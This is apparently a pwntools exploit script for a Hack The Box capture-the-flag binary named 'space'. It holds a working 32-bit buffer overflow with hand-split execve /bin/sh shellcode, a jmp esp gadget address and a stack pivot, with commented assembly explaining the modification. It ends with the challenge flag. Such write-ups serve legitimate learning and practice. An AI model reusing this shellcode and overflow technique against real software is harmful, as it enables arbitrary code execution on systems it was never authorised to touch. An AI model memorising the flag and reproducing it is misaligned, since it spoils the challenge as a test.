# Credit: Ashok Gaire's writeup assisted with locating the memory address for
# new stack @ beginning of user input buffer.
# https://ashokgaire.github.io/posts/SpacePwn/

from pwn import *

# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
context.binary = "./space"
binary = ELF("space")
#libc = ELF("libc.so.6")

#p = remote("178.62.88.144", 30677)
p = process("./space")
#p = gdb.debug("./space", '''
#break *main
#break *vuln
#break *vuln+42
#''')

jmp_esp = p32(0x0804919f)
call_eax = p32(0x08049019)

# 18 bytes
shellcode = "\x31\xd2\x31\xc0\x83\xec\x15\xff\xe4"
shellcode2 = "A" + "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

payload = ""
payload += shellcode2
payload += jmp_esp
payload += shellcode

p.sendline(payload)
p.interactive()


# Shellcode was modified to add stack-pivot gadgets.
#   - sub esp, 0x16
#       - This gadget places ESP to beginning of "A" padding
#           - New stack will start here.
#   - jmp esp
#       - This gadget jmps to ESP (Fake stack) for code execution.

# Original

# [SECTION .text]
# global _start
# _start:
# 
# xor edx,edx ; edx = 0 (it will be used as *envp = NULL)
# xor eax,eax ; eax = 0 (it will be used as a null-terminating char)
# push eax
# push 0x68732f2f
# push 0x6e69622f ; here you got /bin//sh\x00 on the stack
# mov ebx,esp ; ebx <- esp; ebx points to /bin//sh\x00
# mov al, 0xb ; al = 0xb, 11, execve syscall id
# int 0x80 ; execve("/bin//sh\x00",Null,Null)

# Modified Shellcode

# [SECTION .text]
# global _start
# _start:
# 
# xor edx,edx ; edx = 0 (it will be used as *envp = NULL)
# xor eax,eax ; eax = 0 (it will be used as a null-terminating char)
# 
# "i added these two lines"
# sub esp,0x15
# jmp esp  "this will jump 21 steps back on esp"
# "so we split it here , above shellcode goes after eip and below will before eip"
# 
# push eax
# push 0x68732f2f
# push 0x6e69622f ; here you got /bin//sh\x00 on the stack
# mov ebx,esp ; ebx <- esp; ebx points to /bin//sh\x00
# mov al, 0xb ; al = 0xb, 11, execve syscall id
# int 0x80 ; execve("/bin//sh\x00",Null,Null)

# HTB{sh3llc0de_1n_7h3_5p4c3}
